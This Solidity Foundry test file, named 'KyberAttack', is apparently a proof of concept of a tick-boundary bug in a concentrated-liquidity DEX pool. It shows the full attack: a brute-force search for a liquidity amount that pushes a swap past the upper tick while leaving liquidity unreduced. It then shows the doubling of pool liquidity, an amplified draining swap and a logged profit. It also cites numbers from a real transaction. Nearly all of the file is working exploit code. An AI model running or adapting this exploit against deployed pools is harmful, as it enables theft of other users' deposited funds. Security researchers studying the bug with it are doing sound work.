import "forge-std/Test.sol";

import "openzeppelin-contracts/token/ERC20/ERC20.sol";

import "../contracts/Pool.sol";
import "../contracts/Factory.sol";
import "../contracts/oracle/PoolOracle.sol";
import "../contracts/libraries/TickMath.sol";

import "../contracts/libraries/SwapMath.sol";
import "../contracts/periphery/libraries/LiquidityMath.sol";

contract Token is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract KyberAttack is Test {
    Factory factory;
    Pool pool;

    Token token0 = new Token("token0", "TKN1");
    Token token1 = new Token("token1", "TKN2");

    int24 lower = 30000;
    int24 upper = lower + 100;
    uint128 rangeLiquidity;

    uint256 constant INITIAL_AMOUNT = 20_000 ether;

    function setUp() public {
        vm.label(address(token0), "token0");
        vm.label(address(token1), "token1");

        PoolOracle oracle = new PoolOracle();
        oracle.initialize();
        factory = new Factory(0, address(oracle));
        factory.addNFTManager(address(this));
        pool = Pool(factory.createPool(address(token0), address(token1), 10));

        token0 = Token(address(pool.token0()));
        token1 = Token(address(pool.token1()));

        // total amount 20_000 ether
        token0.mint(address(this), INITIAL_AMOUNT / 2);
        token1.mint(address(this), INITIAL_AMOUNT / 2);
    }

    function mintCallback(uint256 qty0, uint256 qty1, bytes calldata data) external {
        if (qty0 > 0) {
            token0.transfer(msg.sender, qty0);
        }
        if (qty1 > 0) {
            token1.transfer(msg.sender, qty1);
        }
    }

    function swapCallback(int256 qty0, int256 qty1, bytes calldata data) external {
        // console2.log("Swap qty0", qty0);
        // console2.log("Swap qty1", qty1);
        if (qty0 > 0) {
            token0.transfer(msg.sender, uint256(qty0));
        }
        if (qty1 > 0) {
            token1.transfer(msg.sender, uint256(qty1));
        }
    }

    function testBruteForceExploit() public {
        // set price to 1, currentTick = 0
        token0.mint(address(pool), 100);
        token1.mint(address(pool), 100);
        pool.unlockPool(1 * 2 ** 96);

        uint160 lowerSqrtP = TickMath.getSqrtRatioAtTick(lower);
        uint160 upperSqrtP = TickMath.getSqrtRatioAtTick(upper);

        // token1 -> token0, swap to lower tick (we'll be the only LP here)
        pool.swap(address(this), type(int256).min, true, TickMath.getSqrtRatioAtTick(lower), "");

        // calc the rough amount of liquidity with amount of 100 ether
        uint128 initLiquidity = LiquidityMath.getLiquidityFromQty0(lowerSqrtP, upperSqrtP, 100 ether);

        uint128 adjustedLiquidity;
        uint256 exploitableToken1Amount;
        {
            (uint128 L, uint128 reinvestL,) = pool.getLiquidityState();
            // find a exploitable liquidity value and adjust our liquidity amount
            (adjustedLiquidity, exploitableToken1Amount) =
                findExploitableLiquidity(initLiquidity, lowerSqrtP, upperSqrtP);
            rangeLiquidity = adjustedLiquidity - reinvestL - L;

            // add out-of-range liquidity [lower, upper]
            pool.mint(address(this), lower, upper, [TickMath.MIN_TICK, lower], rangeLiquidity, "");

            (L, reinvestL,) = pool.getLiquidityState();
            assertEq(L + reinvestL, adjustedLiquidity);
        }

        // token1 -> token0, swap to upper tick
        pool.swap(address(this), int256(exploitableToken1Amount), false, TickMath.MAX_SQRT_RATIO - 1, "");

        // after this swap, we have currentTick == nearestCurrentTick(swap out of the range),
        // but current liquidity is not reduced as expected
        (uint160 sqrtP, int24 currentTick, int24 nearestCurrentTick,) = pool.getPoolState();
        assertEq(currentTick, nearestCurrentTick, "end tick should be equal");
        assertGt(sqrtP, upperSqrtP, "end price should be above of the upper price");

        (uint128 origLiquidity,,) = pool.getLiquidityState();
        console2.log("origLiquidity:", origLiquidity);

        {
            // do a tiny swap(token0 -> token1) to trigger the update of pool liquidity
            pool.swap(address(this), type(int256).max, true, upperSqrtP, "");

            (uint128 newLiquidity,,) = pool.getLiquidityState();
            // liquidity is doubled!!!!
            console2.log("newLiquidity:", newLiquidity);
            assertEq(newLiquidity, 2 * origLiquidity, "liquidity should be doubled");
        }

        // mint some extra tokens to mock the tokens holding by other users in the pool
        token0.mint(address(pool), 100_0000 ether);
        token1.mint(address(pool), 100_0000 ether);

        // swap output is amplified since the liquidity is doubled
        pool.swap(address(this), type(int256).max, true, lowerSqrtP, "");

        // remove liquidity
        pool.burn(lower, upper, rangeLiquidity);

        uint256 profit = token0.balanceOf(address(this)) + token1.balanceOf(address(this)) - INITIAL_AMOUNT;
        console2.log("profit", profit / 1e18, "ether");
    }

    // brute force to find a valid liquidity number that will result in end price above the next price & end tick == next tick
    function findExploitableLiquidity(uint128 liquidityStart, uint160 currentSqrtP, uint160 targetSqrtP)
        public
        view
        returns (uint128, uint256)
    {
        uint128 liquidity = liquidityStart;
        uint256 absDelta = 0;
        uint256 count = 0;
        while (true) {
            liquidity++;
            count++;

            // run the maths in SwamMath.computeSwapStep() to find a liquidity number
            // that satisfies the condition end_price > next_price when using (usedAmount - 1) to swap.
            int256 usedAmount = SwapMath.calcReachAmount(liquidity, currentSqrtP, targetSqrtP, 10, true, false);
            absDelta = uint256(usedAmount) - 1;
            uint256 deltaL = SwapMath.estimateIncrementalLiquidity(absDelta, liquidity, currentSqrtP, 10, true, false);
            uint160 nextSqrtP = uint160(SwapMath.calcFinalPrice(absDelta, liquidity, deltaL, currentSqrtP, true, false));

            if (nextSqrtP > targetSqrtP) {
                // console2.log("liquidity", liquidity);
                break;
            }
            if (count == 10_000_000) {
                revert("unable to find a valid liquidity number");
            }
        }

        return (liquidity, absDelta);
    }

    function testProbability() public {
        uint128 liquidity = 80e18;
        uint256 count = 0;
        uint256 found = 0;
        while (true) {
            liquidity++;
            count++;

            // numbers from TX 0x485e08dc2b6a4b3aeadcb89c3d18a37666dc7d9424961a2091d6b3696792f0f3
            uint160 currentSqrtP = 20282409603651670423947251286016;
            uint160 targetSqrtP = 20693058119558072255662180724088;
            int256 usedAmount = SwapMath.calcReachAmount(liquidity, currentSqrtP, targetSqrtP, 10, true, false);

            uint256 absDelta = uint256(usedAmount) - 1;
            uint256 deltaL = SwapMath.estimateIncrementalLiquidity(absDelta, liquidity, currentSqrtP, 10, true, false);
            uint160 nextSqrtP = uint160(SwapMath.calcFinalPrice(absDelta, liquidity, deltaL, currentSqrtP, true, false));

            // assertEq(nextSqrtP <= targetSqrtP, true);
            if (nextSqrtP > targetSqrtP) {
                // console2.log("liquidity", liquidity);
                found++;
            }
            if (count == 10_000_000) {
                break;
            }
        }
        console2.log("found", found, "in", 10_000_000);
    }

    function testFuzz(uint128 l) public {
        uint128 liquidity = uint128(bound(l, 65e18, 75e18));
        // numbers from TX 0x485e08dc2b6a4b3aeadcb89c3d18a37666dc7d9424961a2091d6b3696792f0f3
        uint160 currentSqrtP = 20282409603651670423947251286016;
        uint160 targetSqrtP = 20693058119558072255662180724088;
        int256 usedAmount = SwapMath.calcReachAmount(liquidity, currentSqrtP, targetSqrtP, 10, true, false);

        uint256 absDelta = uint256(usedAmount) - 1;
        uint256 deltaL = SwapMath.estimateIncrementalLiquidity(absDelta, liquidity, currentSqrtP, 10, true, false);
        uint160 nextSqrtP = uint160(SwapMath.calcFinalPrice(absDelta, liquidity, deltaL, currentSqrtP, true, false));

        console2.log("liquidity", liquidity);
        console2.log("targetSqrtP", targetSqrtP);
        console2.log("nextSqrtP", nextSqrtP);
        // console2.log(nextSqrtP > targetSqrtP);

        assertEq(nextSqrtP <= targetSqrtP, true);
    }
}
